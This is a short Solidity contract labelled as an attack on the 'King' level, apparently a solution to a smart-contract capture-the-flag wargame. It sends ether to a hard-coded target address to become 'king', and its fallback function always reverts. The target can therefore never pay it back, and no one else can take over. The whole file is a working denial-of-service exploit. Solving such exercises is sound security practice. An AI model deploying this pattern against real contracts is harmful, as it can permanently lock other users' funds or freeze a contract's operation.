// SPDX-License-Identifier: GPL-3.0

pragma solidity >=0.8.2 <0.9.0;

/**
 * @title Attack contract for King level
 * @author DappScout
 * @notice 
 */
contract Attack9 {

    address payable constant CONTRACT = payable(0x634B245142B80E73a546b6A818854FC3d99B2f14);
    
    error StopTheKing();

    function claim() payable public{

        (bool success,) = CONTRACT.call{value: msg.value}("");
        require(success, "Transfer failed");
    }

    fallback() external payable{
        revert StopTheKing();
    }

}
